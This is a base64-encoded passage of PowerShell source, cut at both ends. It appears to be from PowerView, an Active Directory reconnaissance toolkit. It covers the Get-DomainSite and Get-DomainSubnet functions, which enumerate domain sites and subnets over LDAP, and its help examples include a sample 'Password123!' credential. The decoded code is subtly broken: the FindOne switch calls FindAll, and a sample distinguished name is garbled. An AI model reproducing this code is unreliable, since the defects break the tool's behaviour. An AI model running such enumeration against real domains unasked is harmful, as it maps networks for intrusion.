V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouUEFSQU1FVEVSIFNlcnZlclRpbWVMaW1pdAoKU3BlY2lmaWVzIHRoZSBtYXhpbXVtIGFtb3VudCBvZiB0aW1lIHRoZSBzZXJ2ZXIgc3BlbmRzIHNlYXJjaGluZy4gRGVmYXVsdCBvZiAxMjAgc2Vjb25kcy4KCi5QQVJBTUVURVIgU2VjdXJpdHlNYXNrcwoKU3BlY2lmaWVzIGFuIG9wdGlvbiBmb3IgZXhhbWluaW5nIHNlY3VyaXR5IGluZm9ybWF0aW9uIG9mIGEgZGlyZWN0b3J5IG9iamVjdC4KT25lIG9mICdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBGaW5kT25lCgpPbmx5IHJldHVybiBvbmUgcmVzdWx0IG9iamVjdC4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5QQVJBTUVURVIgUmF3CgpTd2l0Y2guIFJldHVybiByYXcgcmVzdWx0cyBpbnN0ZWFkIG9mIHRyYW5zbGF0aW5nIHRoZSBmaWVsZHMgaW50byBhIGN1c3RvbSBQU09iamVjdC4KCi5FWEFNUExFCgpHZXQtRG9tYWluU2l0ZQoKUmV0dXJucyB0aGUgY3VycmVudCBzaXRlcyBpbiB0aGUgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5TaXRlICphZG1pbiogLURvbWFpbiB0ZXN0bGFiLmxvY2FsCgpSZXR1cm5zIGFsbCBzaXRlcyB3aXRoICJhZG1pbiIgaW4gdGhlaXIgbmFtZSBpbiB0aGUgdGVzdGxhYi5sb2NhbCBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpblNpdGUgLUdQTGluayAiRjI2MEI3NkQtNTVDOC00NkM1LUJFRjEtOTAxNkREOThFMjcyIgoKUmV0dXJucyBhbGwgc2l0ZXMgd2l0aCBsaW5rZWQgdG8gdGhlIHNwZWNpZmllZCBncm91cCBwb2xpY3kgb2JqZWN0LgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1Eb21haW5TaXRlIC1DcmVkZW50aWFsICRDcmVkCgouT1VUUFVUUwoKUG93ZXJWaWV3LlNpdGUKCkN1c3RvbSBQU09iamVjdCB3aXRoIHRyYW5zbGF0ZWQgc2l0ZSBwcm9wZXJ0eSBmaWVsZHMuCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuU2l0ZScpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ05hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJElkZW50aXR5LAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgW0FsaWFzKCdHVUlEJyldCiAgICAgICAgJEdQTGluaywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJvcGVydGllcywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0RhY2wnLCAnR3JvdXAnLCAnTm9uZScsICdPd25lcicsICdTYWNsJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VjdXJpdHlNYXNrcywKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbQWxpYXMoJ1JldHVybk9uZScpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEZpbmRPbmUsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmF3CiAgICApCgogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdTZWFyY2hCYXNlUHJlZml4JyA9ICdDTj1TaXRlcyxDTj1Db25maWd1cmF0aW9uJwogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJvcGVydGllcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJFByb3BlcnRpZXMgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VjdXJpdHlNYXNrcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VjdXJpdHlNYXNrcyddID0gJFNlY3VyaXR5TWFza3MgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJFNpdGVTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFNpdGVTZWFyY2hlcikgewogICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgPSAnJwogICAgICAgICAgICAkRmlsdGVyID0gJycKICAgICAgICAgICAgJElkZW50aXR5IHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkSWRlbnRpdHlJbnN0YW5jZSA9ICRfLlJlcGxhY2UoJygnLCAnXDI4JykuUmVwbGFjZSgnKScsICdcMjknKQogICAgICAgICAgICAgICAgaWYgKCRJZGVudGl0eUluc3RhbmNlIC1tYXRjaCAnXkNOPS4qJykgewogICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHdWlkQnl0ZVN0cmluZyA9ICgtSm9pbiAoKFtHdWlkXSRJZGVudGl0eUluc3RhbmNlKS5Ub0J5dGVBcnJheSgpIHwgRm9yRWFjaC1PYmplY3QgeyRfLlRvU3RyaW5nKCdYJykuUGFkTGVmdCgyLCcwJyl9KSkgLVJlcGxhY2UgJyguLiknLCdcJDEnCiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKSIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihuYW1lPSRJZGVudGl0eUluc3RhbmNlKSIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRJZGVudGl0eUZpbHRlciAtYW5kICgkSWRlbnRpdHlGaWx0ZXIuVHJpbSgpIC1uZSAnJykgKSB7CiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIofCRJZGVudGl0eUZpbHRlcikiCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0dQTGluayddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblNpdGVdIFNlYXJjaGluZyBmb3Igc2l0ZXMgd2l0aCAkR1BMaW5rIHNldCBpbiB0aGUgZ3BMaW5rIHByb3BlcnR5IgogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKGdwbGluaz0qJEdQTGluayopIgogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluU2l0ZV0gVXNpbmcgYWRkaXRpb25hbCBMREFQIGZpbHRlcjogJExEQVBGaWx0ZXIiCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIkTERBUEZpbHRlciIKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJFNpdGVTZWFyY2hlci5maWx0ZXIgPSAiKCYob2JqZWN0Q2F0ZWdvcnk9c2l0ZSkkRmlsdGVyKSIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5TaXRlXSBHZXQtRG9tYWluU2l0ZSBmaWx0ZXIgc3RyaW5nOiAkKCRTaXRlU2VhcmNoZXIuZmlsdGVyKSIKCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZpbmRPbmUnXSkgeyAkUmVzdWx0cyA9ICRTaXRlU2VhcmNoZXIuRmluZEFsbCgpIH0KICAgICAgICAgICAgZWxzZSB7ICRSZXN1bHRzID0gJFNpdGVTZWFyY2hlci5GaW5kQWxsKCkgfQogICAgICAgICAgICAkUmVzdWx0cyB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmF3J10pIHsKICAgICAgICAgICAgICAgICAgICAjIHJldHVybiByYXcgcmVzdWx0IG9iamVjdHMKICAgICAgICAgICAgICAgICAgICAkU2l0ZSA9ICRfCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkU2l0ZSA9IENvbnZlcnQtTERBUFByb3BlcnR5IC1Qcm9wZXJ0aWVzICRfLlByb3BlcnRpZXMKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRTaXRlLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5TaXRlJykKICAgICAgICAgICAgICAgICRTaXRlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRSZXN1bHRzKSB7CiAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluU2l0ZV0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkU2l0ZVNlYXJjaGVyLmRpc3Bvc2UoKQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Eb21haW5TdWJuZXQgewo8IwouU1lOT1BTSVMKClNlYXJjaCBmb3IgYWxsIHN1Ym5ldHMgb3Igc3BlY2lmaWMgc3VibmV0cyBvYmplY3RzIGluIEFELgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluU2VhcmNoZXIsIENvbnZlcnQtTERBUFByb3BlcnR5ICAKCi5ERVNDUklQVElPTgoKQnVpbGRzIGEgZGlyZWN0b3J5IHNlYXJjaGVyIG9iamVjdCB1c2luZyBHZXQtRG9tYWluU2VhcmNoZXIsIGJ1aWxkcyBhIGN1c3RvbQpMREFQIGZpbHRlciBiYXNlZCBvbiB0YXJnZXRpbmcvZmlsdGVyIHBhcmFtZXRlcnMsIGFuZCBzZWFyY2hlcyBmb3IgYWxsIG9iamVjdHMKbWF0Y2hpbmcgdGhlIGNyaXRlcmlhLiBUbyBvbmx5IHJldHVybiBzcGVjaWZpYyBwcm9wZXJ0aWVzLCB1c2UKIi1Qcm9wZXJ0aWVzIHdoZW5jcmVhdGVkLHVzbmNoYW5nZWQsLi4uIi4gQnkgZGVmYXVsdCwgYWxsIHN1Ym5ldCBvYmplY3RzIGZvcgp0aGUgY3VycmVudCBkb21haW4gYXJlIHJldHVybmVkLgoKLlBBUkFNRVRFUiBJZGVudGl0eQoKQW4gc3VibmV0IG5hbWUgKGUuZy4gJzE5Mi4xNjguNTAuMC8yNCcpLCBEaXN0aW5ndWlzaGVkTmFtZSAoZS5nLiAnQ049MTkyLjE2OC41MC4wLzI0LENOPVN1Ym5ldHMsQ049U2l0ZXMsQ049Q29uZmlndXJhdGlvaWd1cmF0aW9uLERDPXRlc3RsYWIsREM9bG9jYWwnKSwKb3IgR1VJRCAoZS5nLiBjMzc3MjZlZi0yYjY0LTQ1MjQtYjg1Yi02YTk3MDBjMjM0ZGQpLiBXaWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIFNpdGVOYW1lCgpPbmx5IHJldHVybiBzdWJuZXRzIGZyb20gdGhlIHNwZWNpZmllZCBTaXRlTmFtZS4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZpbHRlciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuCgouUEFSQU1FVEVSIFByb3BlcnRpZXMKClNwZWNpZmllcyB0aGUgcHJvcGVydGllcyBvZiB0aGUgb3V0cHV0IG9iamVjdCB0byByZXRyaWV2ZSBmcm9tIHRoZSBzZXJ2ZXIuCgouUEFSQU1FVEVSIFNlYXJjaEJhc2UKClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIgpVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFNlY3VyaXR5TWFza3MKClNwZWNpZmllcyBhbiBvcHRpb24gZm9yIGV4YW1pbmluZyBzZWN1cml0eSBpbmZvcm1hdGlvbiBvZiBhIGRpcmVjdG9yeSBvYmplY3QuCk9uZSBvZiAnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgRmluZE9uZQoKT25seSByZXR1cm4gb25lIHJlc3VsdCBvYmplY3QuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouUEFSQU1FVEVSIFJhdwoKU3dpdGNoLiBSZXR1cm4gcmF3IHJlc3VsdHMgaW5zdGVhZCBvZiB0cmFuc2xhdGluZyB0aGUgZmllbGRzIGludG8gYSBjdXN0b20gUFNPYmplY3QuCgouRVhBTVBMRQoKR2V0LURvbWFpblN1Ym5ldAoKUmV0dXJucyB0aGUgY3VycmVudCBzdWJuZXRzIGluIHRoZSBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpblN1Ym5ldCAqYWRtaW4qIC1Eb21haW4gdGVzdGxhYi5sb2NhbAoKUmV0dXJucyBhbGwgc3VibmV0cyB3aXRoICJhZG1pbiIgaW4gdGhlaXIgbmFtZSBpbiB0aGUgdGVzdGxhYi5sb2NhbCBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpblN1Ym5ldCAtR1BMaW5rICJGMjYwQjc2RC01NUM4LTQ2QzUtQkVGMS05MDE2REQ5OEUyNzIiCgpSZXR1cm5zIGFsbCBzdWJuZXRzIHdpdGggbGlua2VkIHRvIHRoZSBzcGVjaWZpZWQgZ3JvdXAgcG9saWN5IG9iamVjdC4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtRG9tYWluU3VibmV0IC1DcmVkZW50aWFsICRDcmVkCgouT1VUUFVUUwoKUG93ZXJWaWV3LlN1Ym5ldAoKQ3VzdG9tIFBTT2JqZWN0IHdpdGggdHJhbnNsYXRlZCBzdWJuZXQgcHJvcGVydHkgZmllbGRzLgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LlN1Ym5ldCcpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ05hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJElkZW50aXR5LAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNpdGVOYW1lLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExEQVBGaWx0ZXIsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQcm9wZXJ0aWVzLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWN1cml0eU1hc2tzLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCgogICAgICAgIFtBbGlhcygnUmV0dXJuT25lJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRmluZE9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRSYXcKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgJ1NlYXJjaEJhc2VQcmVmaXgnID0gJ0NOPVN1Ym5ldHMsQ049U2l0ZXMsQ049Q29uZmlndXJhdGlvbicKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXSA9ICRQcm9wZXJ0aWVzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlY3VyaXR5TWFza3MnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlY3VyaXR5TWFza3MnXSA9ICRTZWN1cml0eU1hc2tzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICRTdWJuZXRTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFN1Ym5ldFNlYXJjaGVyKSB